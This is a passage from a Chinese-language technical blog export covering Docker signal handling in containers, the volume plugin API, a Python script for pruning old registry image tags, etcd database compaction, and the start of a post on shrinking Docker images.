<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage: docker kill \[OPTIONS\] CONTAINER \[CONTAINER...\]</span><br><span class="line">Kill a running container using SIGKILL or a specified signal</span><br><span class="line">    -s, --signal&#x3D;&quot;KILL&quot;    Signal to send to the container</span><br></pre></td></tr></table></figure>



<p>发送到容器的信号被容器的主进程（PID为1）处理，主进程可以忽略该信号，让默认的操作执行，或者为该信号提供一个回调函数。</p>
<p>举例，在容器内运行一个应用，检查信号处理句柄。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var http &#x3D; require(&#39;http&#39;);</span><br><span class="line">var server &#x3D; http.createServer(function (req, res) &#123;</span><br><span class="line">  res.writeHead(200, &#123;&#39;Content-Type&#39;: &#39;text&#x2F;plain&#39;&#125;);</span><br><span class="line">  res.end(&#39;Hello World\\n&#39;);</span><br><span class="line">&#125;).listen(3000, &#39;0.0.0.0&#39;);</span><br><span class="line">console.log(&#39;server started&#39;);</span><br><span class="line">var signals &#x3D; &#123; &#39;SIGINT&#39;: 2, &#39;SIGTERM&#39;: 15</span><br><span class="line">&#125;;</span><br><span class="line">function shutdown(signal, value) &#123; server.close(function () &#123; console.log(&#39;server stopped by &#39; + signal);</span><br><span class="line">    process.exit(128 + value);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">Object.keys(signals).forEach(function (signal) &#123;</span><br><span class="line">  process.on(signal, function () &#123; shutdown(signal, signals\[signal\]);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p> 我们创建了一个监听3000端口的http server，创建了两个信号处理句柄，分别处理SIGINT和SIGTERM信号，当信号句柄执行时，将会在标准输出打印：</p>
<p>   `server stopped by [SIGNAL]`.</p>
<p>分两种场景描述</p>
<h3 id="该应用是前端应用"><a href="#该应用是前端应用" class="headerlink" title="该应用是前端应用"></a>该应用是前端应用</h3><p>当应用是该容器的主进程时，他能够直接处理信号，以下该应用的dockerfile文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM iojs:onbuild</span><br><span class="line">COPY .&#x2F;program.js .&#x2F;program.js</span><br><span class="line">COPY .&#x2F;package.json .&#x2F;package.json</span><br><span class="line">EXPOSE 3000</span><br><span class="line">ENTRYPOINT \[&quot;node&quot;, &quot;program&quot;\]</span><br></pre></td></tr></table></figure>



<p>当在编写dockerfile文件的时候，启动应用一定要使用ENTRYPOINT或者RUN 命令，否则容器内的主进程将会是/bin/sh –c ，应用只能是主进程的子进程，如果是这样的话，应用是无法收到信号的。</p>
<p>构建镜像:</p>
<p>$ docker build -t signal-fg-app .</p>
<p>运行容器</p>
<p>$ docker run -it –rm -p 3000:3000 –name=”signal-fg-app” signal-fg-app</p>
<p>访问 <a href="http://localhost:3000/" target="_blank" rel="noopener">http://localhost:3000</a> 验证应用正常运行</p>
<p>打开另一个终端执行docker kill 命令</p>
<p>$ docker kill –signal=”SIGTERM” signal-fg-app</p>
<p>或者</p>
<p>$ docker stop signal-fg-app</p>
<p>这两个命令都可以发送SIGTERM信号来停止应用</p>
<p>Both commands can be used to issue SIGTERM signal and stop the application.</p>
<p>在运行应用的终端，可以看到下面的输出日志</p>
<p>server stopped by SIGTERM</p>
<h3 id="当应用是后台应用时"><a href="#当应用是后台应用时" class="headerlink" title="当应用是后台应用时"></a>当应用是后台应用时</h3><p>无法直接将信号发送到该应用，这种场景下的一种解决方法是：以shell脚本的方式启动应用，在这个启动脚本里处理全部的信号，制作该应用的Dokcerfile文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dockerfile:</span><br><span class="line">FROM iojs:onbuild</span><br><span class="line">COPY .&#x2F;program.js .&#x2F;program.js</span><br><span class="line">COPY .&#x2F;program.sh .&#x2F;program.sh</span><br><span class="line">COPY .&#x2F;package.json .&#x2F;package.json</span><br><span class="line">RUN  chmod +x .&#x2F;program.sh</span><br><span class="line">EXPOSE 3000</span><br><span class="line">ENTRYPOINT \[&quot;.&#x2F;program.sh&quot;\]</span><br></pre></td></tr></table></figure>

<p>查看启动脚本program.sh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env bash</span><br><span class="line">set -x</span><br><span class="line"></span><br><span class="line">pid&#x3D;0</span><br><span class="line"></span><br><span class="line"># SIGUSR1-handler</span><br><span class="line">my\_handler() &#123;</span><br><span class="line">  echo &quot;my\_handler&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># SIGTERM-handler</span><br><span class="line">term\_handler() &#123;</span><br><span class="line">  if \[ $pid -ne 0 \]; then</span><br><span class="line">    kill -SIGTERM &quot;$pid&quot;</span><br><span class="line">    wait &quot;$pid&quot;</span><br><span class="line">  fi</span><br><span class="line">  exit 143; # 128 + 15 -- SIGTERM</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># setup handlers</span><br><span class="line"># on callback, kill the last background process, which is \&#96;tail -f &#x2F;dev&#x2F;null\&#96; and execute the specified handler</span><br><span class="line">trap &#39;kill $&#123;!&#125;; my\_handler&#39; SIGUSR1</span><br><span class="line">trap &#39;kill $&#123;!&#125;; term\_handler&#39; SIGTERM</span><br><span class="line"></span><br><span class="line"># run application</span><br><span class="line">node program &amp;</span><br><span class="line">pid&#x3D;&quot;$!&quot;</span><br><span class="line"></span><br><span class="line"># wait indefinetely</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">  tail -f &#x2F;dev&#x2F;null &amp; wait $&#123;!&#125;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>这里我们创建了两个信号处理函数，一个是处理用户定义的信号，一个是处理SIGTEM信号，能够优雅的关闭应用。</p>
<p>在这个应用中，我们的应用是后台运行的（&amp;），最后，我们使用“wait”来暂停运行，直到一个子进程退出，“wait”和“waitpid”这两个函数在收到信号时，会终止执行，当收到信号后，我们使用特定的句柄处理信号。</p>
<p>  docker的文档中说明，SIGCHLD, SIGKILL, and SIGSTOP 是无法代管的。</p>
<p>构建镜像：</p>
<p>docker build -t signal-bg-app .</p>
<p>运行容器:</p>
<p>docker run -it –rm -p 3000:3000 –name=”signal-bg-app” signal-bg-app</p>
<p>打开一个新的终端，发送 SIGUSR1 信号 :</p>
<p>docker kill –signal=”SIGUSR1” signal-bg-app</p>
<p>最后停止应用</p>
<p>docker kill –signal=”SIGTERM” signal-bg-app</p>
<p>应用能够打印相应的日志，并能够优雅的关闭</p>
<p>结论</p>
<p>信号提供了一中处理异步事件的方法，容器能运行的应用可以使用信号进行消息交互。使用信号与主机内的应用进行交互、重新加载配置文件、做一些清楚工作或者多进程协作。</p>
<p>英文地址：</p>
<p><a href="https://medium.com/@gchudnov/trapping-signals-in-docker-containers-7a57fdda7d86#.ukb9dqt9k" target="_blank" rel="noopener">https://medium.com/@gchudnov/trapping-signals-in-docker-containers-7a57fdda7d86#.ukb9dqt9k</a></p>
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>docker插件机制</title>
    <url>/2020/09/21/Docker%E6%8F%92%E4%BB%B6%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h2 id="docker-插件是什么"><a href="#docker-插件是什么" class="headerlink" title="docker 插件是什么"></a>docker 插件是什么</h2><p>docker 插件是 docker 提供出来的扩展机制，目前 docker 支持 volume 和 network 两种插件，由于 network 插件比较复杂而且没有好的开源项目，这里主要介绍 volume 插件。</p>
<p>插件是一个独立的进程和 docker daemon 运行在同一台 host 上，通过 Plugin Discovery 的机制进行插件发现，插件有几个要求：</p>
<ul>
<li>插件名要求是小写</li>
<li>插件可以运行在容器内也可以运行在容器外，不过现阶段建议运行在容器外</li>
</ul>
<h2 id="插件发现"><a href="#插件发现" class="headerlink" title="插件发现"></a>插件发现</h2><p>插件发现机制需要插件将自己的地址文件放在固定目录，方便 docker 发现插件进程，有三种文件可以设置：</p>
<ul>
<li>.sock 文件是 UNIX domain sockets</li>
<li>.spec 文本文件内包含了一个 URL，比如：unix:///other.sock</li>
<li>.json 文本文件包含了插件的完整 JSON 描述</li>
</ul>
<p>UNIX domain socket 文件必须放在 /run/docker/plugins 目录，但是 .spec，.json 文件则可以放在/etc/docker/plugins 或者 /usr/lib/docker/plugins 中。</p>
<p>无后缀的文件名决定了插件的名字，比如 /run/docker/plugins/myplugin.sock 的插件名就是myplugin。你可以在子目录中放置地址文件，比如 /run/docker/plugins/myplugin/myplugin.sock。</p>
<p>docker 优先搜索 /run/docker/plugins 目录，如果没有 unix socket 的话才会去搜索/etc/docker/plugins 和 /usr/lib/docker/plugins，如果根据指定插件名搜到了插件就会立马停止搜索。</p>
<h3 id="json"><a href="#json" class="headerlink" title=".json"></a>.json</h3><p>JSON 格式文件示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Name&quot;: &quot;plugin-example&quot;,  &quot;Addr&quot;: &quot;https:&#x2F;&#x2F;example.com&#x2F;docker&#x2F;plugin&quot;,  &quot;TLSConfig&quot;: &#123;  &quot;InsecureSkipVerify&quot;: false,  &quot;CAFile&quot;: &quot;&#x2F;usr&#x2F;shared&#x2F;docker&#x2F;certs&#x2F;example-ca.pem&quot;,  &quot;CertFile&quot;: &quot;&#x2F;usr&#x2F;shared&#x2F;docker&#x2F;certs&#x2F;example-cert.pem&quot;,  &quot;KeyFile&quot;: &quot;&#x2F;usr&#x2F;shared&#x2F;docker&#x2F;certs&#x2F;example-key.pem&quot;,  &#125; &#125;</span><br></pre></td></tr></table></figure>

<h2 id="插件生命周期"><a href="#插件生命周期" class="headerlink" title="插件生命周期"></a>插件生命周期</h2><ul>
<li>启动插件</li>
<li>启动 docker</li>
<li>停止 docker</li>
<li>停止插件</li>
</ul>
<h2 id="插件激活"><a href="#插件激活" class="headerlink" title="插件激活"></a>插件激活</h2><p>运行命令 docker run –volume-driver=foo 即可以激活名为 foo 的 volume 插件，需要注意的是，插件是按需加载机制，只有被使用到了才会被激活。</p>
<h2 id="volume-插件使用"><a href="#volume-插件使用" class="headerlink" title="volume 插件使用"></a>volume 插件使用</h2><p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -ti -v volumename:&#x2F;data \--volume-driver&#x3D;flocker busybox sh</span><br></pre></td></tr></table></figure>

<p>上面表示的意思是，使用 flocker 插件将 voluemname 挂载到容器的 /data 目录。</p>
<p>注意：volumename 一定不能以 / 开头。（文档说的，没看 docker 源码，我实现一个以 / 开头好像也没问题，应该是规范吧）</p>
<h2 id="插件-API-设计"><a href="#插件-API-设计" class="headerlink" title="插件 API 设计"></a>插件 API 设计</h2><p>插件是 API 是基于 HTTP 的 JSON POST 请求，所以插件需要实现一个 HTTP 服务器并且将其 bind 到一个 UNIX socket 上。API 的版本设置在了 HTTP<br>头里面，现在这个头的固定值为：application/vnd.docker.plugins.v1+json</p>
<p>不过 docker 的开发人员已经提供了一个比较好的 docker volume 的扩展 API 代码，可以参考：<a href="https://github.com/calavera/dkvolume" target="_blank" rel="noopener">docker-volume-extension-api</a></p>
<h3 id="Plugin-Activate"><a href="#Plugin-Activate" class="headerlink" title="/Plugin.Activate"></a>/Plugin.Activate</h3><p>请求：空</p>
<p>响应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Implements:&quot; \[&quot;VolumeDriver&quot;\] &#125;</span><br></pre></td></tr></table></figure>

<p>返回插件实现，表示是 volume 插件</p>
<h3 id="VolumeDriver-Create"><a href="#VolumeDriver-Create" class="headerlink" title="/VolumeDriver.Create"></a>/VolumeDriver.Create</h3><p>请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Name&quot;: &quot;volume\_name&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>告诉插件用户想要创建一个 volume，并将用户输入的 volume 名传给插件。插件在这个时候可以不用理会这个请求，会有真正挂载的请求。</p>
<p>响应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Err&quot;: null &#125;</span><br></pre></td></tr></table></figure>

<p>如果出错返回错误字符串。</p>
<h3 id="VolumeDriver-Remove"><a href="#VolumeDriver-Remove" class="headerlink" title="/VolumeDriver.Remove"></a>/VolumeDriver.Remove</h3><p>与 Create 相对应。</p>
<p>请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Name&quot;: &quot;volume\_name&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>响应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Err&quot;: null &#125;</span><br></pre></td></tr></table></figure>

<h3 id="VolumeDriver-Mount"><a href="#VolumeDriver-Mount" class="headerlink" title="/VolumeDriver.Mount"></a>/VolumeDriver.Mount</h3><p>请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Name&quot;: &quot;volume\_name&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>用户请求挂载某个文件，这个请求仅会在容器启动时发送一次。</p>
<p>响应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Mountpoint&quot;: &quot;&#x2F;path&#x2F;to&#x2F;directory&#x2F;on&#x2F;host&quot;,  &quot;Err&quot;: null &#125;</span><br></pre></td></tr></table></figure>

<p>将 volume_name 挂载的真正挂载点返回给 docker，如果出错则返回错误字符串。</p>
<h3 id="VolumeDriver-Path"><a href="#VolumeDriver-Path" class="headerlink" title="/VolumeDriver.Path"></a>/VolumeDriver.Path</h3><p>请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Name&quot;: &quot;volume\_name&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>响应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Mountpoint&quot;: &quot;&#x2F;path&#x2F;to&#x2F;directory&#x2F;on&#x2F;host&quot;,  &quot;Err&quot;: null &#125;</span><br></pre></td></tr></table></figure>

<p>插件需要管理 volume_name 的真正挂载地址，这个请求需要将 volume_name 挂载的真正挂载点返回给 docker，如果出错则返回错误字符串。</p>
<h3 id="VolumeDriver-Unmount"><a href="#VolumeDriver-Unmount" class="headerlink" title="/VolumeDriver.Unmount"></a>/VolumeDriver.Unmount</h3><p>请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Name&quot;: &quot;volume\_name&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>表示 docker 已经不需要这个 volume 了，插件需要安全的将这个挂载从挂载点卸载。</p>
<p>响应：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  &quot;Err&quot;: null &#125;</span><br><span class="line">&#96;&#96;&#96;</span><br></pre></td></tr></table></figure>
<p>（<a href="http://hongweiyi.com/2015/10/docker-volume-plugin/%EF%BC%89" target="_blank" rel="noopener">http://hongweiyi.com/2015/10/docker-volume-plugin/）</a></p>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker镜像仓库删除历史版本</title>
    <url>/2020/09/21/Docker%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93%E5%88%A0%E9%99%A4%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<p>DevOps环境使用的镜像仓库，一个产品的版本越来越多，需要能够定时将不再使用的历史版本进行删除，编写乐意一段代码，用于删除历史版本的镜像，如下所示```</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import argparse</span><br><span class="line">import http.client</span><br><span class="line">import urllib.error</span><br><span class="line">import urllib.request</span><br><span class="line">import json</span><br><span class="line">import urllib3</span><br><span class="line">import requests</span><br><span class="line">REGISTRY_URL&#x3D;&quot;http:&#x2F;&#x2F;10.10.70.65&quot;</span><br><span class="line">MOST_TAG_NUMBER&#x3D;3</span><br><span class="line">def getAllRepos(registry_repo_url):</span><br><span class="line">    try:</span><br><span class="line">        resp &#x3D; urllib.request.urlopen(registry_repo_url) # type http.client.HTTPResponse</span><br><span class="line">        response &#x3D; resp.read()</span><br><span class="line">    except urllib.error.HTTPError as error:</span><br><span class="line">        print(&quot;get repo error&quot;,error)</span><br><span class="line">    return json.loads(response)</span><br><span class="line"></span><br><span class="line">def getImageDigest(repoName,tagName):</span><br><span class="line">    #http: &#x2F;&#x2F; 10.10.70.65 &#x2F; v2 &#x2F; arch &#x2F; archdemo &#x2F; manifests &#x2F; 1 - 1881</span><br><span class="line"></span><br><span class="line">    #curl -H &quot;Accept: application&#x2F;vnd.docker.distribution.manifest.v2 + json&quot; -X GET -vvv -k http:&#x2F;&#x2F;10.10.70.65&#x2F;v2&#x2F;good_image&#x2F;manifests&#x2F;latest 100</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        req &#x3D; urllib.request.Request(REGISTRY_URL + &quot;&#x2F;v2&#x2F;&quot; + repoName + &quot;&#x2F;manifests&#x2F;&quot;+tagName)</span><br><span class="line">        req.add_header(&#39;Accept&#39;, &#39;application&#x2F;vnd.docker.distribution.manifest.v2+json&#39;)</span><br><span class="line">        resp &#x3D; urllib.request.urlopen(req)</span><br><span class="line">      #  content &#x3D; resp.read()</span><br><span class="line">       # print(&quot;all is&quot;, resp)</span><br><span class="line"></span><br><span class="line">        #print(&quot;content is &quot;,content)</span><br><span class="line">        #print(&quot;digest is&quot;,resp.headers[&quot;docker-Content-Digest&quot;])</span><br><span class="line">    except urllib.error.HTTPError as error:</span><br><span class="line">        print(&quot;get repo error&quot;,error)</span><br><span class="line">    return resp.headers[&quot;docker-Content-Digest&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def deleteTagByTag(repoName, tagName):</span><br><span class="line">    imageDigest&#x3D;getImageDigest(repoName, tagName)</span><br><span class="line">    try:</span><br><span class="line">        print(&quot;delete image %s:%s,digest is %s&quot; %(repoName,tagName,imageDigest))</span><br><span class="line">        req &#x3D; urllib.request.Request(REGISTRY_URL + &quot;&#x2F;v2&#x2F;&quot; + repoName + &quot;&#x2F;manifests&#x2F;&quot;+imageDigest)</span><br><span class="line">        req.get_method &#x3D; lambda: &#39;DELETE&#39;</span><br><span class="line">        resp &#x3D; urllib.request.urlopen(req)</span><br><span class="line">        code &#x3D; resp.getcode()</span><br><span class="line">        print(&quot;delet image code is &quot;,code)</span><br><span class="line">    except urllib.error.HTTPError as error:</span><br><span class="line">        print(&quot;delete image error&quot;,error)</span><br><span class="line"></span><br><span class="line">def cleanByRepo(repoName):</span><br><span class="line">    print(&quot;repos is &quot; + repoName)</span><br><span class="line">    tagList &#x3D; getTagsByRepoNames(REGISTRY_URL + &quot;&#x2F;v2&#x2F;&quot; + repoName + &quot;&#x2F;tags&#x2F;list&quot;)# type</span><br><span class="line">    print(&quot;tagList is &quot;, tagList)</span><br><span class="line">    if tagList[&quot;tags&quot;] is None:</span><br><span class="line">       print(&quot;repo not need to clean,tag is None&quot;, repoName)</span><br><span class="line">       return</span><br><span class="line">    if len(tagList[&quot;tags&quot;])&lt;2:</span><br><span class="line">        print(&quot;repo not need to clean&quot;,repoName)</span><br><span class="line">        return</span><br><span class="line">    tagNum&#x3D;0</span><br><span class="line">    tagNameList&#x3D;[]</span><br><span class="line">    for tag in tagList[&quot;tags&quot;]:</span><br><span class="line">        if tag.startswith(&quot;1-&quot;):</span><br><span class="line">            tagNum&#x3D;tagNum+1</span><br><span class="line">            tagNameList.append(tag)</span><br><span class="line"></span><br><span class="line">    if tagNum&lt;MOST_TAG_NUMBER:</span><br><span class="line">        print(&quot;repo %s not need to clean,tag num %s  is less than 4&quot;   % (repoName,tagNum))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    #print(&quot;repo  %s need to delete some tag,tag num is %s&quot;, % (repoName,tagNum))</span><br><span class="line">    print(&quot;repo  %s need to delete some tag,tag num is %s  &quot; % (repoName,tagNum))</span><br><span class="line">    tagNameList.sort(reverse&#x3D;True)</span><br><span class="line">    for index, _ in enumerate(tagNameList):</span><br><span class="line">        if index&gt;3:</span><br><span class="line">            deleteTagByTag(repoName,tagNameList[index])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getTagsByRepoNames(registry_repo_url):</span><br><span class="line">    try:</span><br><span class="line">        resp &#x3D; urllib.request.urlopen(registry_repo_url)</span><br><span class="line">        response &#x3D; resp.read()</span><br><span class="line">    except urllib.error.HTTPError as error:</span><br><span class="line">        print(&quot;get repo error&quot;,error)</span><br><span class="line">    return json.loads(response)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;get all repo&quot;)</span><br><span class="line">    response&#x3D;getAllRepos(REGISTRY_URL + &quot;&#x2F;v2&#x2F;_catalog?n&#x3D;100000&quot;)</span><br><span class="line">    print(&quot;response is &quot;,response)</span><br><span class="line">    print(&quot;repos list is&quot;,response[&quot;repositories&quot;])</span><br><span class="line"></span><br><span class="line">    for repo in response[&quot;repositories&quot;]:</span><br><span class="line">        cleanByRepo(repo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>上面的代码能保存最新的几个版本的镜像，我这里的版本镜像是以“1-” 开头为标识，执行完该代码后，还需要在镜像仓库的节点，执行以下命令，进行存储回收：```</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">registry garbage-collect &#x2F;etc&#x2F;docker&#x2F;registry&#x2F;config.yml</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Container</tag>
      </tags>
  </entry>
  <entry>
    <title>Etcd的db文件很大</title>
    <url>/2020/09/21/Etcd%E7%9A%84db%E6%96%87%E4%BB%B6%E5%BE%88%E5%A4%A7/</url>
    <content><![CDATA[<p>     Etcd运行一段时间后，发现db占用的空间很大，将etcd内的数据导出，发现只有180多k,为什么会占用这么多空间呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@node3 snap]# pwd</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;etcd&#x2F;member&#x2F;snap</span><br><span class="line">[root@node3 snap]# ll -lh</span><br><span class="line">total 509M</span><br><span class="line">-rw-r--r-- 1 root root 390K Jun 14 12:31 000000000001a198-0000000001357eb0.snap</span><br><span class="line">-rw-r--r-- 1 root root 390K Jun 14 13:11 000000000001a198-000000000135a5c3.snap</span><br><span class="line">-rw-r--r-- 1 root root 390K Jun 14 13:52 000000000001a198-000000000135ccd5.snap</span><br><span class="line">-rw-r--r-- 1 root root 390K Jun 14 14:29 000000000001a198-000000000135f3e6.snap</span><br><span class="line">-rw-r--r-- 1 root root 391K Jun 14 14:50 000000000001a19a-0000000001361af7.snap</span><br><span class="line">-rw------- 1 root root 523M Jun 14 15:05 db</span><br></pre></td></tr></table></figure>

<p>    看一下一下etcd官方的说明</p>
<p>          since etcd keeps an exact history of its keyspace, this history should be periodically compacted to avoid performance degradation and eventual storage space exhaustion。</p>
<p>意思就是etcd保存了keys的历史信息，所以会占用的空间比较大，需要周期的进行压缩，以避免出现性能下降和存储资源耗尽，继续看官方说明</p>
<p>         After compacting the keyspace, the backend database may exhibit internal fragmentation. Any internal fragmentation is space that is free to use by the backend but still consumes storage space. The process of defragmentation releases this storage space back to the file system. Defragmentation is issued on a per-member so that cluster-wide latency spikes may be avoided</p>
<p>     大概的意思是定期压缩etcd 的db后，虽然释放了一些空间，但是只能被etcd使用，并不能被宿主机使用，根据上面的解释，如果不是etcd突然释放大量keys或者etcd需求大量磁盘的场景下，只需要执行compact就可以了，执行defrag是对硬盘的一些操作而已。</p>
<p>     解决方法：</p>
<p>etcd的启动参数增加ETCD_AUTO_COMPACTION_RETENTION=1，如果需要释放硬盘空间，可以执行defrag命令，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@node2 snap]# etcdctl --endpoints http:&#x2F;&#x2F;10.110.17.119:2379  defrag</span><br><span class="line">Finished defragmenting etcd member\[http:&#x2F;&#x2F;10.110.17.119:2379\]</span><br><span class="line">[root@node2 snap]# ll -lh</span><br><span class="line">total 3.0M</span><br><span class="line">-rw-r--r-- 1 root root 390K Jun 14 13:08 000000000001a198-000000000135a24e.snap</span><br><span class="line">-rw-r--r-- 1 root root 390K Jun 14 13:48 000000000001a198-000000000135c961.snap</span><br><span class="line">-rw-r--r-- 1 root root 390K Jun 14 14:27 000000000001a198-000000000135f072.snap</span><br><span class="line">-rw-r--r-- 1 root root 390K Jun 14 14:48 000000000001a19a-0000000001361783.snap</span><br><span class="line">-rw-r--r-- 1 root root 390K Jun 14 15:09 000000000001a19b-0000000001363e96.snap</span><br><span class="line">-rw------- 1 root root  18M Jun 14 15:20 db</span><br></pre></td></tr></table></figure>

<p>附：</p>
<p>Etcd默认的db 配额是2GB，etcd主要用于存储元数据，这个一般就够用了。</p>
]]></content>
  </entry>
  <entry>
    <title>docker精简镜像</title>
    <url>/2020/09/21/Docker%E7%B2%BE%E7%AE%80%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<h3 id="精简docker镜像大小的必要性"><a href="#精简docker镜像大小的必要性" class="headerlink" title="精简docker镜像大小的必要性"></a>精简docker镜像大小的必要性</h3><p>docker镜像由很多镜像层（Layers）组成（最多127层），镜像层依赖于一系列的底层技术，比如文件系统(filesystems)、写时复制(copy-on-write)、联合挂载(union mounts)等技术，你可以查看docker社区文档以了解更多有关docker存储驱动的内容，这里就不再赘述技术细节。总的来说，dockerfile中的每条指令都会创建一个镜像层，继而会增加整体镜像的尺寸。 下面是精简docker镜像尺寸的好处： 1. 减少构建时间 2. 减少磁盘使用量 3. 减少下载时间 4. 因为包含文件少，攻击面减小，提高了安全性 5. 提高部署速度</p>
<h3 id="五点建议减小docker镜像尺寸"><a href="#五点建议减小docker镜像尺寸" class="headerlink" title="五点建议减小docker镜像尺寸"></a>五点建议减小docker镜像尺寸</h3><h3 id="优化基础镜像"><a href="#优化基础镜像" class="headerlink" title="优化基础镜像"></a>优化基础镜像</h3><p>优化基础镜像的方法就是选用合适的更小的基础镜像，常用的 Linux 系统镜像一般有 Ubuntu、CentOs、Alpine，其中Alpine更推荐使用。大小对比如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lynzabo@ubuntu ~&#x2F;s&gt; docker images</span><br><span class="line">REPOSITORY         TAG             IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu             latest        74f8760a2a8b        8 days ago          82.4MB</span><br><span class="line">alpine             latest        11cd0b38bc3c        2 weeks ago         4.41MB</span><br><span class="line">centos               7           49f7960eb7e4        7 weeks ago         200MB</span><br><span class="line">debian             latest        3bbb526d2608        8 days ago          101MB</span><br><span class="line">lynzabo@ubuntu ~&#x2F;s&gt;</span><br></pre></td></tr></table></figure>
<p>Alpine是一个高度精简又包含了基本工具的轻量级Linux发行版，基础镜像只有4.41M，各开发语言和框架都有基于Alpine制作的基础镜像，强烈推荐使用它。Alpine镜像各个语言和框架支持情况，可以参考《优化docker镜像、加速应用部署，教你6个小窍门》。 查看上面的镜像尺寸对比结果，你会发现最小的镜像也有4.41M，那么有办法构建更小的镜像吗？答案是肯定的，例如 gcr.io/google_containers/pause-amd64:3.1 镜像仅有742KB。为什么这个镜像能这么小？在为大家解密之前，再推荐两个基础镜像： 1、scratch镜像 scratch是一个空镜像，只能用于构建其他镜像，比如你要运行一个包含所有依赖的二进制文件，如Golang程序，可以直接使用scratch作为基础镜像。现在给大家展示一下上文提到的Google pause镜像dockerfile：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM scratch</span><br><span class="line">ARG ARCH</span><br><span class="line">ADD bin&#x2F;pause-$&#123;ARCH&#125; &#x2F;pause</span><br><span class="line">ENTRYPOINT [&quot;&#x2F;pause&quot;]</span><br></pre></td></tr></table></figure>
<p>Google pause镜像使用了scratch作为基础镜像，这个镜像本身是不占空间的，使用它构建的镜像大小几乎和二进制文件本身一样大，所以镜像非常小。当然在我们的Golang程序中也会使用。对于一些Golang/C程序，可能会依赖一些动态库，你可以使用自动提取动态库工具，比如ldd、linuxdeployqt等提取所有动态库，然后将二进制文件和依赖动态库一起打包到镜像中。 2、busybox镜像 scratch是个空镜像，如果希望镜像里可以包含一些常用的Linux工具，busybox镜像是个不错选择，镜像本身只有1.16M，非常便于构建小镜像。</p>
<h4 id="串联-dockerfile-指令"><a href="#串联-dockerfile-指令" class="headerlink" title="串联 dockerfile 指令"></a>串联 dockerfile 指令</h4><p>大家在定义dockerfile时，如果太多的使用RUN指令，经常会导致镜像有特别多的层，镜像很臃肿，而且甚至会碰到超出最大层数（127层）限制的问题，遵循 dockerfile 最佳实践，我们应该把多个命令串联合并为一个 RUN（通过运算符&amp;&amp;和/ 来实现），每一个 RUN 要精心设计，确保安装构建最后进行清理，这样才可以降低镜像体积，以及最大化的利用构建缓存。 下面是一个优化前dockerfile：</p>
